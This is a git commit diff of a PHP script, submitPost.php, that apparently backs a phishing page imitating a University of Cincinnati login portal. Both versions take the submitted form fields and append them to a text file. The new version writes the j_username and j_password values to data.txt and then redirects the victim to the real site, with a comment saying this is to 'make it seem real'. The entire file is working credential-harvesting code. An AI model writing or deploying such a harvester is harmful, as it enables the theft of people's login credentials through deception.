91aa20555017ebbad22d79d3c9a1293354f5165a
Christopher Ochs <ochscs@mail.uc.edu>
2019-03-22 16:39:36 -0400

    I hate php

--- submitPost.php
+++ submitPost.php
@@ -1,13 +1,17 @@
 <?php
-header ('Location:www.catalyst.uc.edu');
-$handle = fopen('usernames.txt', 'a');
-foreach($_POST as $variable => $value) {
-    fwrite($handle, $variable);
-    fwrite($handle, '=');
-    fwrite($handle, $value);
-    fwrite($handle, 'rn');
-}
-fwrite($handle, 'rn');
-fclose($handle);
+// Redirect user to valid url to make it seem real
+header ('Location:https://www.catalyst.uc.edu');
+// Create or Open data.txt in appending mode
+$data = fopen('data.txt', 'a');
+// Write the username and password to the file
+fwrite($data, 'username:');
+fwrite($data, $_POST['j_username']);
+// NOTE: must use " in order to use string escape characters
+fwrite($data, "\tpassword:");
+fwrite($data, $_POST['j_password']);
+// NOTE: must use " in order to use string escape characters
+fwrite($data, "\n");
+// Close file
+fclose($data);
 exit;
 ?>
